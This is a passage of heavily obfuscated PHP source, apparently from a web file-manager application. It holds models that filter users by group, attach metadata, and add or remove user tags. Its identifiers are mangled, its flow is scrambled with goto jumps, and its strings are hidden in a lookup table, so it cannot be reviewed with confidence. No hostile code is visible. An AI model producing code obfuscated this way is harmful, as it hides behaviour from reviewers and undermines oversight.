$eÇ–‰¢­¤î[$DóÙç‹”à[348]][$DóÙç‹”à[350]] = ceil($eÇ–‰¢­¤î[$DóÙç‹”à[348]][$DóÙç‹”à[349]] / $eÇ–‰¢­¤î[$DóÙç‹”à[348]][$DóÙç‹”à[346]]); } $this->_listDataApply($eÇ–‰¢­¤î[$DóÙç‹”à[351]]); $this->_filterByGroup($eÇ–‰¢­¤î, $b×‡ĞäÄ—Ã); goto F¼òÇª—Œ¾; aœ¡Ã™ŒĞ: } private function _filterByGroup(&$AªÕÁ‰¤ùÁ, $CÆ²ÈÏšÄ½) { $B‡œáÖœˆ =& $_SERVER[¢à]; if (!$CÆ²ÈÏšÄ½) { return $AªÕÁ‰¤ùÁ; } foreach ($AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[351]] as $d¡íßÚ”² => &$eİ¢Ù‰—Çœ) { $FÚ—ÅÉ‘ = array_to_keyvalue($eİ¢Ù‰—Çœ[$B‡œáÖœˆ[2493]], $B‡œáÖœˆ[33], $B‡œáÖœˆ[2075]); if (!in_array($CÆ²ÈÏšÄ½, $FÚ—ÅÉ‘)) { unset($AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[351]][$d¡íßÚ”²]); } } $AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[351]] = array_values($AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[351]]); $AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[348]] = array($B‡œáÖœˆ[2270] => count($AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[351]]), $B‡œáÖœˆ[2268] => $AªÕÁ‰¤ùÁ[$B‡œáÖœˆ[348]][$B‡œáÖœˆ[346]], $B‡œáÖœˆ[2267] => 1, $B‡œáÖœˆ[2269] => 1); } private function _searchFromMeta($cŒº“ÑĞÊÔ, $Dâ‡ë˜ÑÈ, $a††óµ¶‰ë) { goto bÍ¥Ù•¢Şß; a‰×éš§§: $d¿ºÒ¢•ßÉ = Model($CôÇ›‘š®[2494])->where($b¸µĞš§ª)->limit($a††óµ¶‰ë)->select(); if (!$d¿ºÒ¢•ßÉ) { return array(); } $d¿ºÒ¢•ßÉ = array_to_keyvalue($d¿ºÒ¢•ßÉ, $CôÇ›‘š®[33], $CôÇ›‘š®[1412]); goto eâ„æâ†Š…; bÍ¥Ù•¢Şß: $CôÇ›‘š® =& $_SERVER[¢à]; $Dâ‡ë˜ÑÈ = strtolower($Dâ‡ë˜ÑÈ); $b¸µĞš§ª = array($CôÇ›‘š®[89] => $cŒº“ÑĞÊÔ, $CôÇ›‘š®[356] => array($CôÇ›‘š®[751], "\x25{$Dâ‡ë˜ÑÈ}\45")); goto a‰×éš§§; eâ„æâ†Š…: $AåÒ•ªöçµ = $this->where(array($CôÇ›‘š®[1403] => array($CôÇ›‘š®[7], $d¿ºÒ¢•ßÉ)))->select(); if (!$AåÒ•ªöçµ) { return array(); } return $AåÒ•ªöçµ; goto eñ¿ğ£‰Ù; eñ¿ğ£‰Ù: } private function _listDataApplyItem($B¡ˆ†ñËŸ) { $DŞÍÆ‹İœò = array($B¡ˆ†ñËŸ); $this->_listDataApply($DŞÍÆ‹İœò); return $DŞÍÆ‹İœò[0]; } private function _listDataApply(&$A ëÙ³¾§) { goto a¡¬èÏËŒ; a¢êò†…‰: $this->_listAppendSourceRoot($A ëÙ³¾§, $bƒ’ÓÇ„™š); goto aáæ‘ˆ µ—; a¡¬èÏËŒ: $cŸÂ‡ê•Şø =& $_SERVER[¢à]; if (!$A ëÙ³¾§) { return; } array_remove_key($A ëÙ³¾§, $cŸÂ‡ê•Şø[800]); goto C™ÁÚ© –‚; C™ÁÚ© –‚: $bƒ’ÓÇ„™š = array_to_keyvalue($A ëÙ³¾§, $cŸÂ‡ê•Şø[33], $cŸÂ‡ê•Şø[1412]); $this->_listAppendGroup($A ëÙ³¾§, $bƒ’ÓÇ„™š); $this->_listAppendMeta($A ëÙ³¾§, $bƒ’ÓÇ„™š); goto a¢êò†…‰; aáæ‘ˆ µ—: } private function _listAppendSourceRoot(&$Eœî×Š¡Û®, $C–ò›«ê¢») { goto dŠê¡¯İÁ; A¢ÓÛ¤‡œ: foreach ($Eœî×Š¡Û® as &$c˜šë‘“Ê¸) { $c˜šë‘“Ê¸[$Eãø•ËÈµ[388]] = $B¶ãâß”‡Ü[$c˜šë‘“Ê¸[$Eãø•ËÈµ[1412]]] ? $B¶ãâß”‡Ü[$c˜šë‘“Ê¸[$Eãø•ËÈµ[1412]]] : array(); } goto F¦©áŞ‡÷‡; D‡õÀšŒôà: $B¶ãâß”‡Ü = Model($Eãø•ËÈµ[752])->order($Eãø•ËÈµ[2162])->field($EÄ·—ù‘·)->where($Eç’ì‹ã)->select(); $B¶ãâß”‡Ü = array_to_keyvalue($B¶ãâß”‡Ü, $Eãø•ËÈµ[452]); $B¶ãâß”‡Ü = array_remove_key($B¶ãâß”‡Ü, $Eãø•ËÈµ[452]); goto A¢ÓÛ¤‡œ; dŠê¡¯İÁ: $Eãø•ËÈµ =& $_SERVER[¢à]; $Eç’ì‹ã = array($Eãø•ËÈµ[457] => 0, $Eãø•ËÈµ[368] => SourceModel::TYPE_USER, $Eãø•ËÈµ[452] => array($Eãø•ËÈµ[7], $C–ò›«ê¢»)); $EÄ·—ù‘· = $Eãø•ËÈµ[2161]; goto D‡õÀšŒôà; F¦©áŞ‡÷‡: } private function _listAppendGroup(&$dÂÅ¸„®ï, $Bö†¨Ğé×Í) { goto EªÁ‹ÎŠ³©; EÎ¯ÇË†Õé: $b¤ë¯×èß = array_to_keyvalue($c¹èĞ¸¶‘¸, $CÊñÀøâæ[33], $CÊñÀøâæ[2075]); $b¤ë¯×èß = array_remove_value(array_unique($b¤ë¯×èß), $CÊñÀøâæ[464]); if (!$b¤ë¯×èß || !$c¹èĞ¸¶‘¸) { return; } goto cÁ‘±†ŒÎŸ; CœÒ¨„˜÷”: $c¹èĞ¸¶‘¸ = array_to_keyvalue_group($c¹èĞ¸¶‘¸, $CÊñÀøâæ[1412]); foreach ($c¹èĞ¸¶‘¸ as &$E¨É®Ò‘‹ª) { $Díò‚ò¤¢Ÿ = array(); foreach ($E¨É®Ò‘‹ª as $c‚çİ“ª¿’) { if (!$c‚çİ“ª¿’[$CÊñÀøâæ[2203]]) { continue; } $bÜÄŞ¿ãÑ = Model($CÊñÀøâæ[2222])->listData($c‚çİ“ª¿’[$CÊñÀøâæ[2203]]); $Díò‚ò¤¢Ÿ[] = array($CÊñÀøâæ[2075] => $c‚çİ“ª¿’[$CÊñÀøâæ[2075]], $CÊñÀøâæ[2497] => $Cœ¥»¢¯àÑ[$c‚çİ“ª¿’[$CÊñÀøâæ[2075]]], $CÊñÀøâæ[373] => $bÜÄŞ¿ãÑ); } $E¨É®Ò‘‹ª = $Díò‚ò¤¢Ÿ; } foreach ($dÂÅ¸„®ï as &$dªòƒİŸê) { $dªòƒİŸê[$CÊñÀøâæ[2493]] = array(); if (isset($c¹èĞ¸¶‘¸[$dªòƒİŸê[$CÊñÀøâæ[1412]]])) { $dªòƒİŸê[$CÊñÀøâæ[2493]] = $c¹èĞ¸¶‘¸[$dªòƒİŸê[$CÊñÀøâæ[1412]]]; } } goto c´„×Êµ¼Õ; EªÁ‹ÎŠ³©: $CÊñÀøâæ =& $_SERVER[¢à]; $e®Ûµ¼ŞåÕ = array($CÊñÀøâæ[1412] => array($CÊñÀøâæ[7], $Bö†¨Ğé×Í)); $c¹èĞ¸¶‘¸ = Model($CÊñÀøâæ[2149])->where($e®Ûµ¼ŞåÕ)->select(); goto EÎ¯ÇË†Õé; cÁ‘±†ŒÎŸ: $e®Ûµ¼ŞåÕ = array($CÊñÀøâæ[2075] => array($CÊñÀøâæ[7], $b¤ë¯×èß)); $fÙßìË»ĞË = Model($CÊñÀøâæ[2495])->field($CÊñÀøâæ[2496])->where($e®Ûµ¼ŞåÕ)->select(); $Cœ¥»¢¯àÑ = array_to_keyvalue($fÙßìË»ĞË, $CÊñÀøâæ[2075], $CÊñÀøâæ[28]); goto CœÒ¨„˜÷”; c´„×Êµ¼Õ: } private function _listAppendMeta(&$bÚ‚ã·˜„Å, $F‰Î¥ÍÂ›õ) { goto F®èÛØ¥¡Ç; F’âÀğÑ–”: $d£áêÏ÷ÄÇ = array($dŞÚ¼Îç‡[1412] => array($dŞÚ¼Îç‡[7], $F‰Î¥ÍÂ›õ)); $bÂù§òÊãÛ = Model($dŞÚ¼Îç‡[2471])->where($d£áêÏ÷ÄÇ)->select(); $bÂù§òÊãÛ = array_to_keyvalue_group($bÂù§òÊãÛ, $dŞÚ¼Îç‡[1412]); goto aöŸÊåî¨; F®èÛØ¥¡Ç: $dŞÚ¼Îç‡ =& $_SERVER[¢à]; $d‰íîÏÆøß = UserJobModel::JOB_KEY; $d®„ÙÜ‰â = array($dŞÚ¼Îç‡[2474]); goto F’âÀğÑ–”; aöŸÊåî¨: foreach ($bÂù§òÊãÛ as &$aŠÑØà¾‰Î) { $BÃ¼å¥—ÂÕ = array(); foreach ($aŠÑØà¾‰Î as $eåšæå»Ö˜) { if (!in_array($eåšæå»Ö˜[$dŞÚ¼Îç‡[89]], $d®„ÙÜ‰â)) { $BÃ¼å¥—ÂÕ[$eåšæå»Ö˜[$dŞÚ¼Îç‡[89]]] = $eåšæå»Ö˜[$dŞÚ¼Îç‡[356]]; } } $aŠÑØà¾‰Î = $BÃ¼å¥—ÂÕ; } $eÀ¢ô¥¥ = Model($dŞÚ¼Îç‡[2498]); foreach ($bÚ‚ã·˜„Å as &$c›Ó‘’İï) { $fİŸôå‰à‹ = array(); if (isset($bÂù§òÊãÛ[$c›Ó‘’İï[$dŞÚ¼Îç‡[1412]]])) { $fİŸôå‰à‹ = $bÂù§òÊãÛ[$c›Ó‘’İï[$dŞÚ¼Îç‡[1412]]]; } $c›Ó‘’İï[$dŞÚ¼Îç‡[2499]] = array(); if (isset($fİŸôå‰à‹[$d‰íîÏÆøß])) { $c›Ó‘’İï[$dŞÚ¼Îç‡[2499]] = $eÀ¢ô¥¥->getUserJobInfo($fİŸôå‰à‹[$d‰íîÏÆøß]); } } goto B°á«ëÙ»; B°á«ëÙ»: } public function userSearch($fò ÎéÏ×, $Bô¿„¼„ = "\52") { return Model($_SERVER[¢à][473])->where($fò ÎéÏ×)->field($Bô¿„¼„)->find(); } } goto C“Úù×Á±¥; Dù¹èÚá¤è: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($B¬­å¸ÀŸ„) { $ağ²§•ÄïØ =& $_SERVER[¢à]; return array($ağ²§•ÄïØ[2447] => array(USER_ID, $ağ²§•ÄïØ[2503])); } protected function listData() { $fÇ£ßÒÃ =& $_SERVER[¢à]; $A÷”åÉË = array($fÇ£ßÒÃ[1403] => USER_ID, $fÇ£ßÒÃ[432] => array($fÇ£ßÒÃ[2504], 0)); $EéÑŠáˆ = $fÇ£ßÒÃ[2505]; $CÑ¾ïÂŞóÖ = $fÇ£ßÒÃ[2506]; $D…ØÜµºô† = $this->field($EéÑŠáˆ)->where($A÷”åÉË)->order($CÑ¾ïÂŞóÖ)->select(); return $D…ØÜµºô† ? $D…ØÜµºô† : array(); } protected function listByTag($E´ßÍ¿Éõº) { } protected function addToTag($aÇ²ŠºÅ·ä, $f¾ğøìÆˆ) { $A‡¸á„·Ğ =& $_SERVER[¢à]; if (!Model($A‡¸á„·Ğ[2275])->listData($f¾ğøìÆˆ) || !Model($A‡¸á„·Ğ[752])->pathInfo($aÇ²ŠºÅ·ä)) { return !1; } $D¸µË²îîà = array($A‡¸á„·Ğ[1403] => USER_ID, $A‡¸á„·Ğ[432] => $f¾ğøìÆˆ, $A‡¸á„·Ğ[384] => $aÇ²ŠºÅ·ä, $A‡¸á„·Ğ[385] => $A‡¸á„·Ğ[379], $A‡¸á„·Ğ[383] => $A‡¸á„·Ğ[33], $A‡¸á„·Ğ[2079] => 0); if ($this->where($D¸µË²îîà)->find()) { return !1; } return $this->add($D¸µË²îîà); } protected function removeFromTag($Cª ŠØ§·, $Eæ’‚Æ¦æ) { $D°‹íæß”‡ =& $_SERVER[¢à]; if (!Model($D°‹íæß”‡[2275])->listData($Eæ’‚Æ¦æ) || !Model($D°‹íæß”‡[752])->pathInfo($Cª ŠØ§·)) { return !1; } $Eé†İà¿íİ = array($D°‹íæß”‡[1403] => USER_ID, $D°‹íæß”‡[432] => $Eæ’‚Æ¦æ, $D°‹íæß”‡[385] => $D°‹íæß”‡[379], $D°‹íæß”‡[384] => $Cª ŠØ§·); return $this->where($Eé†İà¿íİ)->delete(); } protected function removeByTag($DÏ¾îä‚…Ô) { $cÂ“«šõîÍ =& $_SERVER[¢à]; if (!$DÏ¾îä‚…Ô) { return !1; } $BÎÅËÇ¡äÇ = array($cÂ“«šõîÍ[1403] => USER_ID, $cÂ“«šõîÍ[432] => $DÏ¾îä‚…Ô); return $this->where($BÎÅËÇ¡äÇ)->delete(); } protected function removeBySource($bÙµÂ«èƒ¤) { $Eºƒµ²İ´Õ =& $_SERVER[¢à]; $Bê–ŠêÒÕ = array($Eºƒµ²İ´Õ[1403] => USER_ID, $Eºƒµ²İ´Õ[384] => $bÙµÂ«èƒ¤, $Eºƒµ²İ´Õ[432] => array($Eºƒµ²İ´Õ[926], 0)); return $this->where($Bê–ŠêÒÕ)->delete(); } }